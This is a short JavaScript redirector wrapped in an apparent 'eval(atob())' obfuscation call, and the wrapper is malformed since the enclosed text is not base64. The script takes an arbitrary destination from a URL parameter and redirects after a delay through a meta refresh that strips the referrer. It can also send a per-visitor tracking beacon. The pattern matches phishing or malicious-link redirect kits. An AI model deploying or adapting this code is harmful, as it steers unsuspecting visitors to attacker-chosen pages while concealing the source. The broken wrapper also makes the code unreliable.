eval\(atob\('(function() {
  // Configuration
  var CONFIG = {
    trackerUrl: '',           // Set your tracker endpoint here
    redirectDelay: 1755,      // Milliseconds to wait before redirecting
    sourceParamName: 'source',
    idParamName: 'io0'        // Correct parameter for your tracking ID
  };

  var redirectWithoutReferrer = function(url) {
    var meta = document.createElement('meta');
    meta.httpEquiv = 'refresh';
    meta.content = '0; url=' + url;
    document.getElementsByTagName('head')[0].appendChild(meta);
  };

  var params = new URLSearchParams(window.location.search);
  var fileParam = params.get('file');
  var idParam = params.get(CONFIG.idParamName);

  // Regex to extract the 'source' destination from the 'file' parameter
  var regex = new RegExp(CONFIG.sourceParamName + '=([^&]+)');
  var match = fileParam ? fileParam.match(regex) : null;
  var target = match ? match[1] : null;

  // 1. Optional Tracking: Only executes if 'io0' AND 'trackerUrl' are present
  if (idParam && CONFIG.trackerUrl) {
    new Image().src = CONFIG.trackerUrl + '?id=' + encodeURIComponent(idParam) + '&t=' + Date.now();
  }

  // 2. Redirect: Executes for all visitors if a source is found
  setTimeout(function() {
    if (target) {
      // If target starts with '.', append to current domain origin
      var destination = target.startsWith('.') ? window.location.origin + target : target;
      redirectWithoutReferrer(destination);
    }
  }, CONFIG.redirectDelay);
})();'\)\)
